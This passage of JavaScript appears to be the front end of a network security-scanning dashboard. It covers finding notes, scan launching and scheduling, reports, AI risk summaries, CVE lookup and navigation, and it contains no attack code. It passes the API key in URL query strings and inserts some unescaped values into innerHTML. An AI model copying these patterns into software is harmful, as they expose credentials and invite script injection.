          <option value="false_positive" ${f.remediation_status==='false_positive'?'selected':''}>False Positive</option>
          <option value="accepted_risk"  ${f.remediation_status==='accepted_risk'?'selected':''}>Accepted Risk</option>
        </select>
      </span></div>
    </div>

    <div class="finding-notes">
      <div class="finding-notes-label">Analyst Notes</div>
      <textarea class="code-textarea" id="findingNoteInput" rows="3" placeholder="Add analysis notes, reproduction steps, or observations…">${esc(f.analyst_note || '')}</textarea>
      <div class="notes-save-row">
        <button class="btn btn-ghost btn-sm" onclick="saveFindingNoteAndStatus('${f.id}')">Save</button>
        <span class="notes-saved-msg" id="notesSavedMsg">Saved!</span>
      </div>
    </div>`;

  const btn = document.getElementById('suppressFindingBtn');
  if (btn) {
    btn.textContent = f.suppressed ? 'Un-suppress' : 'Mark False Positive';
    btn.onclick = async () => {
      try {
        await api(`/api/v1/findings/${f.id}/suppress`, { method: f.suppressed ? 'DELETE' : 'PATCH' });
        closeModal(); loadFindings();
        addEvent('task', `Finding ${f.id.slice(0,8)} ${f.suppressed ? 'un-suppressed' : 'suppressed'}`);
      } catch(e) { showError(`Failed: ${e.message}`); }
    };
  }
  openModal('findingModal');
}

async function saveFindingNoteAndStatus(findingId) {
  const note   = document.getElementById('findingNoteInput')?.value || '';
  const status = document.getElementById('findingRemStatus')?.value || 'new';
  try {
    await Promise.all([
      api(`/api/v1/findings/${findingId}/note`, { method: 'PATCH', body: JSON.stringify({ note }) }),
      api(`/api/v1/findings/${findingId}/status`, { method: 'PATCH', body: JSON.stringify({ status, note }) }),
    ]);
    const msg = document.getElementById('notesSavedMsg');
    if (msg) { msg.style.opacity = '1'; setTimeout(() => msg.style.opacity = '0', 2000); }
    loadFindings();
  } catch(e) { showError(`Save failed: ${e.message}`); }
}

// ── Quick Scan ────────────────────────────────────────────────

async function quickScan() {
  const name   = document.getElementById('qsScanName')?.value.trim() || 'Quick Scan';
  const subnet = document.getElementById('qsSubnet')?.value.trim() || '';
  const btn    = document.getElementById('quickScanSubmitBtn');
  if (btn) { btn.disabled = true; btn.textContent = '… Launching'; }
  try {
    const scan = await api('/api/v1/scans', {
      method: 'POST',
      body: JSON.stringify({ name, config: { subnets: subnet ? [subnet] : [], target: subnet } }),
    });
    document.getElementById('quickScanBar').style.display = 'none';
    addEvent('probe', `Scan "${name}" launched (${scan.id.slice(0,8)})`);
    loadScans(); loadDashboardStats();
    showLiveScan(scan.id, name); connectWS(scan.id);
  } catch(e) { showError(`Launch failed: ${e.message}`); }
  finally { if (btn) { btn.disabled = false; btn.textContent = '▶ Launch'; } }
}

// ── Scan Templates ────────────────────────────────────────────

let _cachedTemplates = [];

async function loadTemplatesIntoSelect() {
  try {
    _cachedTemplates = await api('/api/v1/scan-templates');
    const sel = document.getElementById('scanTemplateSelect');
    if (!sel) return;
    sel.innerHTML = '<option value="">— Blank scan —</option>' +
      _cachedTemplates.map(t => `<option value="${t.id}">${esc(t.name)}</option>`).join('');
  } catch(e) { /* templates optional, fail silently */ }
}

function applyTemplate(templateId) {
  if (!templateId) return;
  const tpl = _cachedTemplates.find(t => t.id === templateId);
  if (!tpl) return;
  const nameEl    = document.getElementById('scanName');
  const subnetsEl = document.getElementById('scanSubnets');
  if (nameEl    && tpl.scan_name) nameEl.value    = tpl.scan_name;
  if (subnetsEl && tpl.config?.target) subnetsEl.value = tpl.config.target;
}

// ── New Scan ──────────────────────────────────────────────────

async function submitNewScan() {
  const name    = document.getElementById('scanName')?.value.trim();
  const subnets = document.getElementById('scanSubnets')?.value.trim();
  const probeId = document.getElementById('scanProbeSelect')?.value;
  if (!name) return showError('Scan name is required.');
  try {
    const scan = await api('/api/v1/scans', {
      method: 'POST',
      body: JSON.stringify({
        name, probe_id: probeId || null,
        config: { subnets: subnets ? subnets.split(',').map(s=>s.trim()) : [], target: subnets?.split(',')[0]?.trim() || '' },
      }),
    });
    closeModal(); loadScans(); navigateTo('dashboard');
    showLiveScan(scan.id, name); connectWS(scan.id);
    addEvent('probe', `Scan "${name}" launched (${scan.id.slice(0,8)})`);
  } catch(e) { showError(`Failed: ${e.message}`); }
}

// ── Schedules ─────────────────────────────────────────────────

async function submitNewSchedule() {
  const name    = document.getElementById('scheduleName').value.trim();
  const cron    = document.getElementById('scheduleCron').value.trim();
  const probeId = document.getElementById('scheduleProbeSelect').value;
  const subnets = document.getElementById('scheduleSubnets').value.trim();
  const enabled = document.getElementById('scheduleEnabled').checked;
  if (!name) return showError('Schedule name required.');
  if (!cron) return showError('Cron expression required.');
  try {
    await api('/api/v1/schedules', {
      method: 'POST',
      body: JSON.stringify({
        name, cron_expression: cron, probe_id: probeId || null,
        config: { subnets: subnets ? subnets.split(',').map(s=>s.trim()) : [] },
        enabled,
      }),
    });
    closeModal(); loadSchedules();
    addEvent('probe', `Schedule "${name}" created`);
  } catch(e) { showError(`Failed: ${e.message}`); }
}

async function runScheduleNow(scheduleId) {
  try {
    await api(`/api/v1/schedules/${scheduleId}/run`, { method: 'POST' });
    addEvent('probe', `Schedule ${scheduleId.slice(0,8)} triggered`);
    loadScans();
  } catch(e) { showError(`Run failed: ${e.message}`); }
}

async function toggleSchedule(scheduleId, currentlyEnabled) {
  try {
    await api(`/api/v1/schedules/${scheduleId}`, { method: 'PUT', body: JSON.stringify({ enabled: !currentlyEnabled }) });
    loadSchedules();
    addEvent('probe', `Schedule ${scheduleId.slice(0,8)} ${currentlyEnabled ? 'paused' : 'enabled'}`);
  } catch(e) { showError(`Toggle failed: ${e.message}`); }
}

async function deleteSchedule(scheduleId) {
  const ok = await showConfirm({ title:'Delete Schedule', subtitle:'This cannot be undone', message:'Remove this scheduled scan? Future runs will be cancelled.', okLabel:'Delete', icon:'🗑', iconBg:'rgba(240,79,89,0.15)' });
  if (!ok) return;
  try {
    await api(`/api/v1/schedules/${scheduleId}`, { method: 'DELETE' });
    loadSchedules(); addEvent('probe', 'Schedule deleted');
  } catch(e) { showError(`Delete failed: ${e.message}`); }
}

// ── Reports ───────────────────────────────────────────────────

async function generateReport(scanId) {
  try {
    const report = await api(`/api/v1/reports/scans/${scanId}`, { method: 'POST' });
    loadReports(); addEvent('probe', `Report generated for scan ${scanId.slice(0,8)}`);
    return report;
  } catch(e) { showError(`Report generation failed: ${e.message}`); }
}

async function runReportAI(reportId) {
  try {
    addEvent('task', `Running analysis on report ${reportId.slice(0,8)}…`);
    const analysis = await api(`/api/v1/reports/${reportId}/analyse`, { method: 'POST' });
    viewAISummaryData(analysis);
    loadReports();
  } catch(e) { showError(`AI analysis failed: ${e.message}`); }
}

async function emailReport(reportId, scanName) {
  const to = prompt(`Send report "${scanName}" to which email address?`);
  if (!to) return;
  const note = prompt('Optional message to include (leave blank to skip):') || '';
  try {
    await api(`/api/v1/reports/${reportId}/email`, {
      method: 'POST',
      body: JSON.stringify({ to, message: note }),
    });
    addEvent('task', `Report emailed to ${to}`);
    showToast?.(`Report sent to ${to}`, 'success') || alert(`Report sent to ${to}`);
  } catch(e) { showError(`Email failed: ${e.message}`); }
}

async function viewAISummary(reportId) {
  try {
    const summary = await api(`/api/v1/reports/${reportId}/summary`);
    viewAISummaryData(summary);
  } catch(e) { showError(`Could not load AI summary: ${e.message}`); }
}

// ── AI Intel ─────────────────────────────────────────────────

function viewAISummaryData(analysis) {
  navigateTo('intelligence');
  const container = document.getElementById('aiResult');
  const badge     = document.getElementById('aiModelBadge');
  if (!analysis) { container.innerHTML = `<div class="ai-error">No analysis returned.</div>`; return; }
  if (badge) badge.textContent = analysis.ai_powered === false ? 'Rules Engine' : 'Claude Opus';

  if (analysis.error && !analysis.key_risks && !analysis.remediation_plan) {
    container.innerHTML = `<div class="ai-error">${esc(analysis.executive_summary || analysis.error)}</div>`;
    return;
  }

  const note = analysis.ai_powered === false
    ? `<div class="ai-note">⚙ Generated by Xarex rules engine. Add <code>ANTHROPIC_API_KEY</code> in Settings → .env for Claude-powered analysis.</div>` : '';

  container.innerHTML = `
    ${note}
    <div class="ai-section">
      <div class="ai-section-title">Executive Summary</div>
      <div class="ai-text">${esc(analysis.executive_summary || '—')}</div>
    </div>
    ${analysis.risk_score != null ? `
    <div class="ai-risk-score">Overall Risk Score <strong class="risk-num-inline">${analysis.risk_score}/10</strong></div>` : ''}
    ${analysis.key_risks?.length ? `
    <div class="ai-section">
      <div class="ai-section-title">Key Risk Areas</div>
      <ul class="ai-list">${analysis.key_risks.map(r=>`<li>${esc(r)}</li>`).join('')}</ul>
    </div>` : ''}
    ${analysis.attack_narrative ? `
    <div class="ai-section">
      <div class="ai-section-title">Attack Narrative</div>
      <div class="ai-text">${esc(analysis.attack_narrative)}</div>
    </div>` : ''}
    ${analysis.quick_wins?.length ? `
    <div class="ai-section">
      <div class="ai-section-title">Quick Wins — Fix Today</div>
      <ul class="ai-list">${analysis.quick_wins.map(w=>`<li>${esc(w)}</li>`).join('')}</ul>
    </div>` : ''}
    ${analysis.remediation_plan?.length ? `
    <div class="ai-section">
      <div class="ai-section-title">Prioritised Remediation Plan</div>
      ${analysis.remediation_plan.map((r,i) => `
        <div class="remediation-item">
          <div class="rem-header">#${i+1} ${esc(r.action)} <span class="effort-badge effort-${r.effort}">${r.effort} effort</span></div>
          <div class="rem-body">${esc(r.impact||'')}${r.hosts_affected?.length ? ' — Hosts: '+r.hosts_affected.map(h=>`<code>${esc(h)}</code>`).join(', '):''}
          </div>
        </div>`).join('')}
    </div>` : ''}
    ${analysis.attack_techniques_observed?.length ? `
    <div class="ai-section">
      <div class="ai-section-title">MITRE ATT&amp;CK Techniques</div>
      <div class="techniques-grid">
        ${analysis.attack_techniques_observed.map(t=>`
          <div class="technique-card">
            <div class="technique-id">
              <a href="https://attack.mitre.org/techniques/${esc(t.technique_id.split('.')[0])}/" target="_blank">
                <code>${esc(t.technique_id)}</code>
              </a>
            </div>
            <div class="technique-name">${esc(t.name)}</div>
            ${t.description ? `<div class="technique-desc">${esc(t.description)}</div>` : ''}
          </div>`).join('')}
      </div>
    </div>` : ''}`;
}

async function runAIAnalysis() {
  const scanId = document.getElementById('aiScanFilter').value;
  if (!scanId) return showError('Select a scan first.');

  document.getElementById('aiLoading').style.display = 'flex';
  document.getElementById('aiResult').innerHTML = '';

  try {
    const reports = await api('/api/v1/reports').catch(() => []);
    let report = reports.find(r => r.scan_id === scanId);
    if (!report) report = await api(`/api/v1/reports/scans/${scanId}`, { method: 'POST' });
    const analysis = await api(`/api/v1/reports/${report.id}/analyse`, { method: 'POST' });
    viewAISummaryData(analysis);
  } catch(e) {
    showError(`Analysis failed: ${e.message}`);
    document.getElementById('aiResult').innerHTML = `<div class="ai-error">${esc(e.message)}</div>`;
  } finally {
    document.getElementById('aiLoading').style.display = 'none';
  }
}

// ── CVE Lookup ────────────────────────────────────────────────

async function enrichCVE(findingId, cveId) {
  try {
    addEvent('task', `Enriching ${cveId}…`);
    const data = await api(`/api/v1/findings/${findingId}/enrich`, { method: 'POST' });
    addEvent('probe', `${cveId}: CVSS ${data.cvss_score || '—'} (${data.cvss_severity || '—'})`);
    loadFindings();
  } catch(e) { showError(`Enrichment failed: ${e.message}`); }
}

async function lookupCVE() {
  const cveId     = document.getElementById('cveInput').value.trim();
  if (!cveId) return;
  const container = document.getElementById('cveResult');
  container.innerHTML = '<div style="color:var(--accent);padding:12px">Fetching from NVD…</div>';
  try {
    const resp = await fetch(`https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${encodeURIComponent(cveId)}`);
    const data  = await resp.json();
    const items = data.vulnerabilities || [];
    if (!items.length) { container.innerHTML = '<div class="cve-not-found">CVE not found in NVD</div>'; return; }
    const cve   = items[0].cve;
    const cvss  = cve.metrics?.cvssMetricV31?.[0]?.cvssData;
    const desc  = cve.descriptions?.find(d=>d.lang==='en')?.value || '—';
    const pub   = cve.published?.slice(0,10) || '—';
    container.innerHTML = `
      <div class="cve-card">
        <div class="cve-header">
          <span class="cve-id">${esc(cveId)}</span>
          ${cvss ? `<span class="cvss-score cvss-${cvssColor(cvss.baseScore)}">${cvss.baseScore} ${cvss.baseSeverity}</span>` : ''}
        </div>
        <div class="cve-desc">${esc(desc)}</div>
        <div class="cve-meta">Published: ${pub}${cvss ? ` · Vector: <code>${esc(cvss.vectorString)}</code>` : ''}</div>
      </div>`;
  } catch(e) { container.innerHTML = `<div class="cve-error">Lookup failed: ${e.message}</div>`; }
}

// ── Export ────────────────────────────────────────────────────

function exportFindings(format) {
  const scanId   = document.getElementById('scanFilter').value;
  const severity = document.getElementById('severityFilter').value;
  let url = `${STATE.brainUrl}/api/v1/findings/export.${format}?`;
  if (scanId)   url += `scan_id=${scanId}&`;
  if (severity) url += `severity=${severity}&`;
  url += `api_key=${STATE.apiKey}`;
  window.open(url, '_blank');
}

// ── Helpers ───────────────────────────────────────────────────

function sevLabel(n) { return ['Info','Low','Medium','High','Critical'][n] ?? 'Unknown'; }
function cvssColor(s) { if (s>=9)return'critical'; if(s>=7)return'high'; if(s>=4)return'medium'; if(s>0)return'low'; return'info'; }
function riskToSev(s) { if(s>=8)return 4; if(s>=6)return 3; if(s>=4)return 2; if(s>=2)return 1; return 0; }
function setText(id, v) { const el=document.getElementById(id); if(el) el.textContent=v; }

function fmtDate(iso) {
  if (!iso) return '—';
  const d = new Date(iso);
  return d.toLocaleDateString('en-GB', { day:'2-digit', month:'short', year:'numeric' })
    + ' ' + d.toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' });
}

function esc(s) {
  if (!s) return '';
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// ── Ops Console ──────────────────────────────────────────────
const _OPS_CHECK_LABELS = {
  HOST_DISCOVERY:       'HOST-DISC',
  PORT_SCAN:            'PORT-SCAN',
  SERVICE_FINGERPRINT:  'SVC-FP',
  VULN_CHECK:           'VULN',
  DEFAULT_CRED_TEST:    'CRED-TEST',
  SMB_RELAY_CHECK:      'SMB-RELAY',
  LLMNR_POISON_CHECK:   'LLMNR',
  KERBEROAST_ENUM:      'KERBEROAST',
  ACTIVE_DIRECTORY_ENUM:'AD-ENUM',
  SSL_TLS_AUDIT:        'SSL/TLS',
  HTTP_SECURITY_HEADERS:'HTTP-HDR',
  DNS_ZONE_TRANSFER:    'DNS-XFR',
  EXPOSED_ADMIN_PANEL:  'ADMIN',
  SNMP_COMMUNITY_STRING:'SNMP',
  RDP_SECURITY_CHECK:   'RDP',
  WEB_APP_SCAN:         'WEB-SCAN',
};

let _opsPaused = false;

// Initialise Ops Console controls (called once on DOMContentLoaded)
function initOpsConsole() {
  const feed    = document.getElementById('eventFeed');
  const pauseBtn = document.getElementById('opsPauseBtn');
  const clearBtn = document.getElementById('opsClearBtn');
  const filterBar = document.getElementById('opsFilterBar');

  if (pauseBtn) {
    pauseBtn.addEventListener('click', () => {
      _opsPaused = !_opsPaused;
      pauseBtn.textContent = _opsPaused ? '▶ Resume' : '⏸ Pause';
      pauseBtn.classList.toggle('paused', _opsPaused);
    });
  }
  if (clearBtn) {
    clearBtn.addEventListener('click', () => {
      if (!feed) return;
      feed.innerHTML = '<div class="ops-empty">Feed cleared</div>';
    });
  }
  if (filterBar && feed) {
    filterBar.querySelectorAll('.ops-filter').forEach(btn => {
      btn.addEventListener('click', () => {
        filterBar.querySelectorAll('.ops-filter').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        feed.dataset.filter = btn.dataset.filter;
      });
    });
  }
}

// {sev, host, port, checkType, title, desc, remediation}
function addOpsEvent({ sev = 'info', host = '', port = null, checkType = '', title = '', desc = '', remediation = '' } = {}) {
  const feed = document.getElementById('eventFeed');
  if (!feed) return;

  // Remove placeholder
  const empty = feed.querySelector('.ops-empty');
  if (empty) empty.remove();

  const ts  = new Date().toLocaleTimeString([], { hour:'2-digit', minute:'2-digit', second:'2-digit' });
  const hostStr = host ? (port ? `${host}:${port}` : host) : '—';
  const checkLabel = _OPS_CHECK_LABELS[checkType] || checkType || '—';
  const hasDetail  = !!(desc || remediation);

  const item = document.createElement('div');
  item.className   = `ops-item${sev === 'critical' ? ' ops-new' : ''}`;
  item.dataset.sev = sev;
  if (hasDetail) item.dataset.expandable = 'true';

  item.innerHTML = `
    <div class="ops-item-main">
      <span class="ops-ts">${ts}</span>
      <span class="ops-sev ops-sev-${sev}">${sev.toUpperCase()}</span>
      <span class="ops-host" title="${hostStr}">${hostStr}</span>
      <span class="ops-check" title="${checkType}">${checkLabel}</span>
      <span class="ops-item-title" title="${esc(title)}">${esc(title)}</span>
      <span class="ops-expand-icon">▶</span>
    </div>
    ${hasDetail ? `<div class="ops-item-detail">
      ${desc        ? `<div class="ops-detail-desc">${esc(desc)}</div>` : ''}
      ${remediation ? `<div class="ops-detail-rem">${esc(remediation)}</div>` : ''}
    </div>` : ''}`;

  if (hasDetail) {
    item.querySelector('.ops-item-main').addEventListener('click', () => {
      item.classList.toggle('expanded');
    });
  }

  if (!_opsPaused) {
    feed.prepend(item);
    // Trim to 120 events
    while (feed.children.length > 120) feed.removeChild(feed.lastChild);
  } else {
    // Still add but don't scroll; mark as queued while paused
    feed.prepend(item);
    while (feed.children.length > 120) feed.removeChild(feed.lastChild);
  }
}

// Backwards-compat shim used by WS connect/disconnect and error paths
function addEvent(cls, msg) {
  const sevMap = { finding: 'error', probe: 'info', task: 'info', ok: 'task', warn: 'info' };
  addOpsEvent({ sev: sevMap[cls] || 'info', title: msg, checkType: '' });
}

function updateOpsStats() {
  const bar = document.getElementById('opsStatsBar');
  if (!bar) return;
  const dot = document.getElementById('opsLiveDot');
  if (dot) dot.classList.toggle('active', !LIVE.done && LIVE.total > 0);

  if (LIVE.total === 0 && !LIVE.scanId) {
    bar.innerHTML = '<span class="ops-stat-idle">Idle — launch a scan to begin</span>';
    return;
  }
  bar.innerHTML = [
    LIVE.crit   ? `<span class="ops-stat-chip ops-chip-crit">${LIVE.crit} CRIT</span>`  : '',
    LIVE.high   ? `<span class="ops-stat-chip ops-chip-high">${LIVE.high} HIGH</span>`  : '',
    LIVE.hosts  ? `<span class="ops-stat-chip ops-chip-hosts">${LIVE.hosts} HOSTS</span>` : '',
    LIVE.total  ? `<span class="ops-stat-chip ops-chip-total">${LIVE.total} TOTAL</span>` : '',
  ].join('');
}

function showError(msg) { addOpsEvent({ sev: 'error', title: '⚠ ' + msg }); }

function populateScanFilter(scans) {
  ['scanFilter','apScanFilter','hostScanFilter','topoScanFilter'].forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    const cur = el.value;
    el.innerHTML = '<option value="">All Scans</option>' + scans.map(s=>`<option value="${s.id}">${esc(s.name)}</option>`).join('');
    if (cur) el.value = cur;
  });
}

function populateAIScanFilter(scans) {
  const el = document.getElementById('aiScanFilter');
  if (!el) return;
  const cur = el.value;
  el.innerHTML = '<option value="">— Select Scan —</option>' + scans.map(s=>`<option value="${s.id}">${esc(s.name)}</option>`).join('');
  if (cur) el.value = cur;
}

function populateProbeSelect(probes) {
  const opts = '<option value="">Auto-select</option>' + probes.map(p=>`<option value="${p.probe_id}">${esc(p.probe_id)}</option>`).join('');
  ['scanProbeSelect','scheduleProbeSelect'].forEach(id => { const el=document.getElementById(id); if(el) el.innerHTML=opts; });
}

function updateDeployCmd() {
  const cmd = `# Step 1 — Build the probe (requires Go 1.21+)
cd /mnt/c/Users/abdul/OneDrive/Desktop/projs/xarex/probe
go build -o xarex-probe ./cmd/probe

# Step 2 — Launch the probe
sudo ./xarex-probe \\
  --brain-url ${STATE.brainUrl} \\
  --api-key   ${STATE.apiKey || '<YOUR_API_KEY>'} \\
  --probe-id  probe-$(hostname) \\
  --log-level info`;
  setText('deployCmd', cmd);
  setText('subscriptionUrl', `${STATE.brainUrl}/probes/config?api_key=${STATE.apiKey}`);
}

function viewScan(scanId) {
  document.getElementById('apScanFilter').value = scanId;
  loadAttackPaths(scanId);
  navigateTo('attack-paths');
}

// ── Navigation ────────────────────────────────────────────────

// ── Navigation — Section + Page (2026 redesign) ───────────────

const SECTIONS = {
  dashboard: {
    label: 'Dashboard',
    tabs: [],
    defaultPage: 'dashboard',
  },
  scans: {
    label: 'Scans',
    tabs: [
      { label: 'Active Scans',  page: 'scans',        icon: '<path d="M21 21l-4.35-4.35"/><circle cx="11" cy="11" r="7"/>' },
      { label: 'Findings',      page: 'findings',     icon: '<path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>', badge: 'navCritCount' },
      { label: 'Attack Paths',  page: 'attack-paths', icon: '<circle cx="5" cy="12" r="2"/><circle cx="19" cy="5" r="2"/><circle cx="19" cy="19" r="2"/><path d="M7 12h4l4-5M11 12l4 5"/>' },
      { label: 'Reports',       page: 'reports',      icon: '<path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/>' },
      { label: 'Schedules',     page: 'schedules',    icon: '<rect x="3" y="4" width="18" height="18" rx="2"/><path d="M16 2v4M8 2v4M3 10h18"/>' },
    ],
    defaultPage: 'scans',
  },
  recon: {
    label: 'Recon',
    tabs: [
      { label: 'Hosts',         page: 'hosts',        icon: '<rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/>' },
      { label: 'Subdomains',    page: 'subdomains',   icon: '<circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>' },
      { label: 'OSINT Emails',  page: 'osint-emails', icon: '<rect x="2" y="4" width="20" height="16" rx="2"/><polyline points="22,4 12,13 2,4"/>' },
      { label: 'Network Map',   page: 'topology',     icon: '<circle cx="5" cy="5" r="2"/><circle cx="19" cy="5" r="2"/><circle cx="12" cy="19" r="2"/><circle cx="12" cy="11" r="2"/><line x1="7" y1="5" x2="17" y2="5"/>' },
      { label: 'Scan Diff',     page: 'diff',         icon: '<path d="M18 20V10M12 20V4M6 20v-6"/>' },
      { label: 'Crown Jewels',  page: 'crownjewels',  icon: '<path d="M12 2l2.4 7.4H22l-6.2 4.5 2.4 7.4L12 17l-6.2 4.3 2.4-7.4L2 9.4h7.6L12 2z"/>', badge: 'navJewelCount' },
    ],
    defaultPage: 'subdomains',
  },
  intel: {
    label: 'Intel',
    tabs: [
      { label: 'Threat Intel',  page: 'threatintel',  icon: '<circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/><path d="M11 8v3l2 2"/>' },
      { label: 'Threat Actors', page: 'threats',      icon: '<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>' },
      { label: 'CVE Watch',     page: 'cvewatch',     icon: '<path d="M22 12h-4l-3 9L9 3l-3 9H2"/>', badge: 'navCVECount' },
      { label: 'AI Analysis',   page: 'intelligence', icon: '<path d="M12 2a8 8 0 108 8"/><path d="M20 2v6h-6"/><path d="M12 12l4-4"/>' },
      { label: 'Compliance',    page: 'compliance',   icon: '<path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h11"/>' },
      { label: 'Phishing Sim',  page: 'phishing',     icon: '<path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/>' },
    ],
    defaultPage: 'threatintel',
  },
  protect: {
    label: 'Protect',
    tabs: [
      { label: 'Security Score',   page: 'security-score',  icon: '<path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>' },
      { label: 'Breach Monitor',   page: 'breach-monitor',  icon: '<path d="M18 8h1a4 4 0 010 8h-1"/><path d="M2 8h16v9a4 4 0 01-4 4H6a4 4 0 01-4-4V8z"/>' },
      { label: 'Domain Guardian',  page: 'domain-guardian', icon: '<circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>' },
      { label: 'Home Guardian',    page: 'home-guardian',   icon: '<path d="M3 9.5L12 3l9 6.5V20a1 1 0 01-1 1H4a1 1 0 01-1-1V9.5z"/><polyline points="9 22 9 12 15 12 15 22"/>' },
      { label: 'Digital Footprint',page: 'footprint',       icon: '<circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/>' },
      { label: 'Secrets Scanner',  page: 'secrets-scanner', icon: '<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>' },
      { label: 'Notifications',    page: 'notifications',   icon: '<path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 01-3.46 0"/>', badge: 'navNotifBadge' },
    ],
    defaultPage: 'security-score',
  },
  toolkit: {
    label: 'Toolkit',
    tabs: [
      { label: 'Link Analyzer',   page: 'link-analyzer',  icon: '<path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/>' },
      { label: 'Password Tools',  page: 'password-tools', icon: '<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>' },
      { label: 'Privacy Check',   page: 'privacy-check',  icon: '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>' },
      { label: 'Pentest Tools',   page: 'tools',          icon: '<path d="M14.7 6.3a1 1 0 000 1.4l1.6 1.6a1 1 0 001.4 0l3.77-3.77a6 6 0 01-7.94 7.94l-6.91 6.91a2.12 2.12 0 01-3-3l6.91-6.91a6 6 0 017.94-7.94l-3.76 3.76z"/>' },
    ],
    defaultPage: 'link-analyzer',
  },
  platform: {
    label: 'Platform',
    tabs: [
      { label: 'Probes',       page: 'probes',       icon: '<circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/>', badge: 'navProbeCount' },
      { label: 'Deploy Probe', page: 'deploy-probe', icon: '<path d="M22 12h-4l-3 9L9 3l-3 9H2"/>' },
      { label: 'Integrations', page: 'integrations', icon: '<rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 3h2a2 2 0 012 2v2"/><path d="M8 3H6a2 2 0 00-2 2v2"/>' },
      { label: 'Settings',     page: 'settings',     icon: '<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0"/>' },
    ],
    defaultPage: 'probes',
  },
};

// Build reverse lookup: page → section
const PAGE_SECTION = {};
Object.entries(SECTIONS).forEach(([sec, cfg]) => {
  if (cfg.tabs.length === 0) { PAGE_SECTION[cfg.defaultPage] = sec; return; }
  cfg.tabs.forEach(t => { PAGE_SECTION[t.page] = sec; });
});

function _buildSectionTabs(section) {
  const cfg = SECTIONS[section];
  if (!cfg || cfg.tabs.length === 0) { return ''; }
  return cfg.tabs.map(t => {
    const badgeHtml = t.badge
      ? `<span class="sec-tab-badge" id="${t.badge}_tab" style="display:none">0</span>`
      : '';
    return `<button class="sec-tab" data-page="${t.page}" onclick="navigateTo('${t.page}')">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">${t.icon}</svg>
      ${t.label}${badgeHtml}
    </button>`;
  }).join('');
}

function _activateSectionNav(section) {
  // Sidebar
  document.querySelectorAll('.nav-section').forEach(n => {
    n.classList.toggle('active', n.dataset.section === section);
  });
  // Tab bar
  const tabsEl    = document.getElementById('sectionTabs');
  const innerEl   = document.getElementById('sectionTabsInner');
  if (!tabsEl || !innerEl) return;
  const cfg = SECTIONS[section];
  if (!cfg || cfg.tabs.length === 0) {
    tabsEl.style.display = 'none';
  } else {
    innerEl.innerHTML = _buildSectionTabs(section);
    tabsEl.style.display = '';
  }
  // Sync badge values into tab badges
  ['navCritCount','navJewelCount','navCVECount','navProbeCount','navNotifBadge'].forEach(id => {
    const src = document.getElementById(id);
    const dst = document.getElementById(id + '_tab');
    if (src && dst) {
      dst.textContent  = src.textContent;
      dst.style.display = src.style.display;
    }
  });
}

function navigateTo(page) {
  // Show the correct page
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.getElementById(`page-${page}`)?.classList.add('active');

  // Activate section + tab bar
  const section = PAGE_SECTION[page] || 'dashboard';
  _activateSectionNav(section);

  // Highlight active tab
  document.querySelectorAll('.sec-tab').forEach(t => {
    t.classList.toggle('active', t.dataset.page === page);
  });

  // Breadcrumb
  const pageLabels = {};
  Object.values(SECTIONS).forEach(cfg => {
    cfg.tabs.forEach(t => { pageLabels[t.page] = t.label; });
    if (cfg.tabs.length === 0) pageLabels[cfg.defaultPage] = cfg.label;
  });
  const sectionLabel = SECTIONS[section]?.label || 'Xarex';
  const pageLabel    = pageLabels[page] || page;
  const crumb = document.getElementById('pageTitle');
  if (crumb) crumb.textContent = section === 'dashboard' ? 'Dashboard' : pageLabel;
  const rootEl = document.querySelector('.breadcrumb-root');
  if (rootEl) rootEl.textContent = section === 'dashboard' ? 'Xarex' : sectionLabel;

  // Page-specific data loads
  if (page === 'attack-paths') {
    const el = document.getElementById('apScanFilter');
    if (el && !el.value && STATE.scans.length) el.value = STATE.scans[0].id;
